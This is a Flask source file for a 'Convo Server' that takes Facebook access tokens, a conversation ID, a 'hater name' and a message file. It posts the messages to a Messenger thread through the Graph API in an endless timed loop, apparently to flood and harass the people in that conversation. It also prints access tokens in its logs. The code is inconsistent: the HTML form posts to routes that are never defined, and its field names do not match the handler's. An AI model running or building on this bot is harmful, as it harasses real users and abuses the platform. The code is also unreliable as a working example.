from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)

    return '''
    
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thread Management</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1e1e1e;
            color: #00ffcc;
            font-family: 'Roboto', sans-serif;
            padding: 20px;
            margin: 0;
        }
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        .container {
            max-width: 600px;
            margin: auto;
        }
        .card {
            background-color: #2b2b2b;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 2px solid #00ffcc;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: none; /* Initially hidden */
        }
        input, button {
            padding: 10px;
            margin: 5px 0;
            width: 100%;
            color: #00ffcc;
            background-color: #1e1e1e;
            border: 1px solid #00ffcc;
            border-radius: 5px;
        }
        button {
            cursor: pointer;
            background-color: #00ffcc;
            color: #1e1e1e;
            font-weight: bold;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            font-size: 0.9em;
        }
    </style>
    <script>
        function showStartMenu() {
            document.getElementById('startCard').style.display = 'block';
            document.getElementById('stopCard').style.display = 'none';
        }

        function showStopMenu() {
            document.getElementById('startCard').style.display = 'none';
            document.getElementById('stopCard').style.display = 'block';
        }
    </script>
</head>
<body>
    <header>
        <h1>Vampiir3 Convo Server</h1>
        <button onclick="showStartMenu()">Start</button>
        <button onclick="showStopMenu()">Stop</button>
    </header>

    <div class="container">
        <div id="startCard" class="card">
            <h2>Convo</h2>
            <form action="/start_thread" method="post" enctype="multipart/form-data">
                <input type="file" name="tokensFile" required>
                <input type="text" name="thread_id" placeholder="Enter Conversation ID" required>
                <input type="text" name="hater_name" placeholder="Enter hater name" required>
                <input type="file" name="messages_file" required>
                <input type="number" name="delay" placeholder="Enter delay in seconds" required>
                <button type="submit">Start Thread</button>
            </form>
        </div>

        <div id="stopCard" class="card">
            <h2>Stop a Running Thread</h2>
            <form action="/stop_thread" method="post">
                <input type="text" name="identifier" placeholder="Enter thread identifier to stop" required>
                <button type="submit">Stop Thread</button>
            </form>
        </div>
    </div>

    <footer>
        <p>&copy; 2024 Convo Server System made by KavYwnsh Thakur| All Rights Reserved</p>
    </footer>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
